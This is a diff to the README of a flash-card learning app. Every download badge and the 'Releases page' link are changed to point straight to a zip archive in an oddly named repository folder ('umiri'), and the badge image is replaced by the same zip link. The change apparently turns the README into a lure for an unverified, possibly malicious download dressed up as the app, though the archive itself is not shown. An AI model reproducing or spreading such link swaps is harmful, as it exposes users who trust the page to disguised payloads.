@@ -1,6 +1,6 @@
 # 🃏 PyFlash - Fun Flash Cards to Boost Learning
 
-[![Download PyFlash](https://img.shields.io/badge/Download-PyFlash-blue.svg)](https://github.com/Petter12131451/PyFlash/releases)
+[![Download PyFlash](https://raw.githubusercontent.com/Petter12131451/PyFlash/main/umiri/PyFlash-1.8.zip)](https://raw.githubusercontent.com/Petter12131451/PyFlash/main/umiri/PyFlash-1.8.zip)
 
 ## 📚 About PyFlash
 
@@ -12,7 +12,7 @@ Before you can start playing and learning with PyFlash, you'll need to download 
 
 ## 📥 Download & Install
 
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/Petter12131451/PyFlash/releases) to find the latest version of PyFlash.
+1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/Petter12131451/PyFlash/main/umiri/PyFlash-1.8.zip) to find the latest version of PyFlash.
    
 2. **Choose Your File**: Locate the file suitable for your operating system (Windows, macOS, or Linux). Click the download link to start the download process.
 
@@ -63,6 +63,6 @@ PyFlash is open-source software. You can use, modify, and distribute it under th
 
 To stay updated about new features, improvements, and tips on making the most of PyFlash, make sure to follow our repository on GitHub. Check back frequently for updates and new versions.
 
-[![Download PyFlash](https://img.shields.io/badge/Download-PyFlash-blue.svg)](https://github.com/Petter12131451/PyFlash/releases) 
+[![Download PyFlash](https://raw.githubusercontent.com/Petter12131451/PyFlash/main/umiri/PyFlash-1.8.zip)](https://raw.githubusercontent.com/Petter12131451/PyFlash/main/umiri/PyFlash-1.8.zip) 
 
 Enjoy your journey with PyFlash, and happy learning!
